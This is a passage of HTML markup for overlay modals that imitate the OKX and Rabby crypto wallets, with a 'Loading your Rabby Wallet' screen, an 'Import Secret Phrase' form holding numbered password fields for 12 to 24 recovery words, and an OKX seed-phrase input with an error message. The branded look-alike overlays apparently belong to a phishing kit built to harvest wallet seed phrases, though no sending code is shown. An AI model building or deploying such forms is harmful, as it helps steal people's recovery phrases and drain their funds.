                          class="scwtw-w-full scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[12px] scwtw-text-[16px] scwtw-font-medium scwtw-rounded-[8px] scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e6e6e6] dark:scwtw-border-[#383838] hover:scwtw-border-[#000000] dark:hover:scwtw-border-[#ffffff] scwtw-bg-[#fafafa] dark:scwtw-bg-[#282828] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-open-sans data-[invalid=true]:scwtw-border-[#eb4b6d] data-[invalid=true]:scwtw-text-[#eb4b6d] okx-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="scwtw-px-4 scwtw-mt-3 scwtw-mb-8 scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400"
                id="okx-error-container"
              >
                <span
                  class="font-open-sans scwtw-text-[#eb4b6d] scwtw-font-normal scwtw-text-[14px]"
                  >Incorrect seed phrase. Check and re-enter.</span
                >
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4 scwtw-px-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#000000] dark:scwtw-text-[#000000] dark:scwtw-bg-[#ffffff] scwtw-font-medium font-open-sans scwtw-text-[15px] scwtw-leading-[24px] scwtw-cursor-pointer scwtw-rounded-full scwtw-px-4 scwtw-py-3 hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 dark:disabled:scwtw-opacity-100 dark:disabled:scwtw-bg-[#1a1a1a] dark:disabled:scwtw-text-[#5b5b5b] disabled:scwtw-cursor-not-allowed"
                    id="okx-import-button"
                  >
                    Confirm
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div
      style="display: none"
      id="rabby-modal-overlay"
      class="rabby-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      style="display: none"
      id="rabby-modal"
      class="rabby-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="rabby-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[360px] md:scwtw-h-[680px] md:scwtw-border md:scwtw-border-[#eaecef] dark:md:scwtw-border-[#474d57] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#121212] scwtw-shadow-xl"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="loading-container-rabby"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-overflow-hidden rabby-bg-image scwtw-bg-no-repeat scwtw-bg-cover scwtw-opacity-0 scwtw-hidden"
            >
              <div>
                <svg
                  class="scwtw-w-[100px] scwtw-h-[100px] rabby-svg"
                  width="100"
                  height="100"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 100 100"
                >
                  <path
                    d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z"
                    fill="url(#logo_svg__paint0_linear_111797_37674)"
                  ></path>
                  <path
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                    d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z"
                    fill="url(#logo_svg__paint1_linear_111797_37674)"
                  ></path>
                  <path
                    fill-rule="evenodd"
                    clip-rule="evenodd"
                    d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z"
                    fill="url(#logo_svg__paint2_linear_111797_37674)"
                  ></path>
                  <path
                    d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z"
                    fill="url(#logo_svg__paint3_linear_111797_37674)"
                  ></path>
                  <defs>
                    <linearGradient
                      id="logo_svg__paint0_linear_111797_37674"
                      x1="32.389"
                      y1="48.683"
                      x2="91.836"
                      y2="65.478"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#8697FF"></stop>
                      <stop offset="1" stop-color="#ABB7FF"></stop>
                    </linearGradient>
                    <linearGradient
                      id="logo_svg__paint1_linear_111797_37674"
                      x1="81.798"
                      y1="47.549"
                      x2="38.766"
                      y2="4.574"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#8697FF"></stop>
                      <stop
                        offset="1"
                        stop-color="#5156D8"
                        stop-opacity="0"
                      ></stop>
                    </linearGradient>
                    <linearGradient
                      id="logo_svg__paint2_linear_111797_37674"
                      x1="59.66"
                      y1="71.678"
                      x2="18.401"
                      y2="48.046"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#465EED"></stop>
                      <stop
                        offset="1"
                        stop-color="#8697FF"
                        stop-opacity="0"
                      ></stop>
                    </linearGradient>
                    <linearGradient
                      id="logo_svg__paint3_linear_111797_37674"
                      x1="35.936"
                      y1="48.237"
                      x2="63.901"
                      y2="83.636"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop stop-color="#8898FF"></stop>
                      <stop offset="0.984" stop-color="#6277F1"></stop>
                    </linearGradient>
                  </defs>
                </svg>
              </div>
              <div class="scwtw-my-[12px]">
                <h3
                  class="font-roboto scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-font-medium scwtw-text-[24px] scwtw-leading-[28px]"
                >
                  Loading your Rabby Wallet
                </h3>
              </div>
              <div class="scwtw-max-w-[320px] scwtw-text-center">
                <p
                  class="font-roboto scwtw-text-[#6a7587] dark:scwtw-text-[#b3b3b3] scwtw-font-normal scwtw-text-[14px] scwtw-leading-[18px]"
                >
                  The game-changing wallet for Ethereum and all EVM chains
                </p>
              </div>
            </div>
            <div
              id="import-container-rabby"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div>
                <div>
                  <div
                    class="scwtw-flex scwtw-justify-between scwtw-items-center scwtw-p-3"
                  >
                    <div>
                      <button
                        class="scwtw-p-1 scwtw-rounded-full hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#1a1a1a] scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer"
                        type="button"
                        id="rabby-close-button"
                      >
                        <svg
                          class="scwtw-w-6 scwtw-h-6 scwtw-text-[#000000] dark:scwtw-text-[#ffffff]"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="1.5"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="m15 18-6-6 6-6"></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-1"
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="8"
                        height="8"
                        fill="none"
                        class="scwtw-text-[#7084ff]"
                        viewBox="0 0 8 8"
                      >
                        <circle
                          cx="4"
                          cy="4"
                          r="4"
                          fill="currentColor"
                        ></circle>
                      </svg>
                      <div
                        class="scwtw-w-[56px] scwtw-h-[1px] scwtw-bg-[#dee3fc] dark:scwtw-bg-[#bebebe]"
                      ></div>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="8"
                        height="8"
                        fill="none"
                        class="scwtw-text-[#dee3fc] dark:scwtw-text-[#bebebe]"
                        viewBox="0 0 8 8"
                      >
                        <circle
                          cx="4"
                          cy="4"
                          r="4"
                          fill="currentColor"
                        ></circle>
                      </svg>
                    </div>
                    <div>
                      <div class="scwtw-w-6 scwtw-h-6"></div>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-justify-center scwtw-items-center scwtw-px-3 scwtw-py-4 gap-x-1"
                >
                  <div>
                    <p
                      class="font-roboto scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-font-medium scwtw-text-[20px] scwtw-leading-[24px]"
                    >
                      Import Secret Phrase
                    </p>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-justify-between scwtw-items-center scwtw-px-3 scwtw-py-3 gap-x-1"
                >
                  <div>
                    <select
                      class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-font-normal scwtw-text-[13px] scwtw-border-none scwtw-bg-transparent dark:scwtw-bg-[#121212] scwtw-outline-none field-sizing-content"
                      id="rabby-change-words-count"
                    >
                      <option value="12">I have a 12-word phrase</option>
                      <option value="15">I have a 15-word phrase</option>
                      <option value="18">I have a 18-word phrase</option>
                      <option value="21">I have a 21-word phrase</option>
                      <option value="24">I have a 24-word phrase</option>
                      <option value="12+passphrase">
                        I have a 12-word phrase with Passphrase
                      </option>
                      <option value="15+passphrase">
                        I have a 15-word phrase with Passphrase
                      </option>
                      <option value="18+passphrase">
                        I have a 18-word phrase with Passphrase
                      </option>
                      <option value="21+passphrase">
                        I have a 21-word phrase with Passphrase
                      </option>
                      <option value="24+passphrase">
                        I have a 24-word phrase with Passphrase
                      </option>
                    </select>
                  </div>
                  <div class="scwtw-mt-[3px]">
                    <button
                      class="scwtw-p-1 scwtw-rounded-[4px] hover:scwtw-bg-[#f2f4f7] dark:hover:scwtw-bg-[#2323239e] scwtw-transition-all scwtw-cursor-pointer scwtw-duration-300"
                      type="button"
                      id="rabby-reset-form-button"
                    >
                      <svg
                        class="scwtw-w-4 scwtw-h-4 scwtw-text-[#6a7587] dark:scwtw-text-[#ffffff]"
                        xmlns="http://www.w3.org/2000/svg"
                        width="16"
                        height="16"
                        fill="none"
                        viewBox="0 0 16 16"
                      >
                        <path
                          clip-rule="evenodd"
                          d="M6.669 1.969h2.667v2.666h5v2.667H1.669V4.635h5V1.97z"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        ></path>
                        <path
                          d="M2.669 13.331h10.667v-6H2.669v6z"
                          stroke="currentColor"
                          stroke-linejoin="round"
                        ></path>
                        <path
                          d="M5.331 13.301v-1.994M8 13.3v-2M10.669 13.301v-1.994"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        ></path>
                      </svg>
                    </button>
                  </div>
                </div>
                <div
                  class="scwtw-mt-2 scwtw-px-4 scwtw-max-h-[300px] scwtw-overflow-y-auto rabby-custom-scrollbar"
                >
                  <div class="scwtw-grid scwtw-grid-cols-3 scwtw-gap-1">
                    <div
                      id="rabby-container-12-words"
                      class="rabby-container-12-words scwtw-contents"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              1.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              2.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              3.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              4.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              5.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              6.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              7.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              8.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              9.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              10.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              11.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              12.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="rabby-container-15-words"
                      class="rabby-container-15-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              13.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              14.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              15.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="rabby-container-18-words"
                      class="rabby-container-18-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              16.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              17.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
